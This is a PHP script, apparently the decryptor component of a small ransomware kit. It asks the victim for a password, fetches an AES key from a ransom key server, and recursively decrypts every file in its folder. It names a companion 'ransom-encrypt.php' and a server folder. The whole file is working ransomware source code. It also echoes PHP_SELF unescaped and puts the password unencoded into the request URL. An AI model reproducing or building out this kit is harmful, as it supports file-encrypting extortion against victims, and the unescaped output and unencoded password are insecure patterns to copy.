<?php
error_reporting(0);
echo 'Starting to decrypt. <br><br>';

$countFile = 0;
$dir    = './';

?>

<html>
    <center>
        <h1>Decrypting Files</h1>
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
            <input type="password" name="password"/>
            <input type="submit" value="Decrypt!"/>
        </form>
    </center>
</html>

<?php

//put server id and retrieve the key
$id = '';

//retrieve $key from server
$key = null;

$passwordget = $_POST['password'];

if(!empty($passwordget))
{
	echo 'fetching key from server..<br>';
    $url = 'http://localhost:8000/api/';

	if($response = file_get_contents($url . "get/key?password=" . $passwordget))
	{
		echo 'Success making connection! <br>';
		$res = json_decode($response);
		$id = $res->id;
		if($id != 'not found!')
		{
			$key = $res->key;
			findFileInFolder($dir, $countFile, $key);
			echo '<hr>Total decrypted file is : ' . $countFile;
		} else {
			echo 'password matched is not found!<br>';
		}
	} else {
		echo 'fail to fetching key! <br>';
	}
}

function findFileInFolder($dir, &$countFile, $key)
{
    $files = scandir($dir);

    //scan for each file
    for($i = 2; $i < count($files); $i++)
    {
        if(strpos($files[$i], ".") !== false)
        {
            if(strpos($files[$i], basename(__FILE__)) !== false)
            {
                echo 'Skipped (' . basename(__FILE__) . '). <br>';
            } else if(strpos($files[$i], 'ransom-encrypt.php') !== false)
            {
                echo 'Skipped (ransom-encrypt.php). <br>';
            } else {
                $countFile++;
                $dirSingle = $dir . '/' . $files[$i];
                getFileNCall($dirSingle, $key);
                echo '&nbsp;&nbsp;File [' . ($i-2) . '] - ' . $files[$i] . '<br>';
                echo '<br> Location : ' . $dirSingle . '<hr>';
            }
        } else {
			if(strpos($files[$i], 'put_in_server') !== false)
            {
                echo 'Skipped (Folder [put_in_server]). <br>';
            } else {
				echo '[Folder] - (' . $files[$i] . ') => [<br><div style="position : relative; left : 20px;">';
            
				$dirFolder = $dir . '/' . $files[$i];
				findFileInFolder($dirFolder, $countFile, $key);
				echo ']</div><br>';
			}
        }
    }
}

function getFileNCall($filesDir, $key)
{
    $filesDir = substr($filesDir, 3);
    $filesDir = str_replace(' ', '\ ', $filesDir);
    $code = file_get_contents($filesDir); //Get the encrypted string.
    $decrypted_code = decrypt($code, $key); //decrypt it with the key
    echo $filesDir . ' was decrypted! <br>';
    file_put_contents($filesDir, $decrypted_code); //Save the decrypted code to the original directory
}

//thanks stack overflow
function decrypt($data, $key) {
    $encryption_key = base64_decode($key);
    list($encrypted_data, $iv) = explode('::', base64_decode($data), 2);
    return openssl_decrypt($encrypted_data, 'aes-256-cbc', $encryption_key, 0, $iv);
}

//references for decryption
//https://stackoverflow.com/questions/54322647/php-encrypt-files-using-openssl-encrypt
?>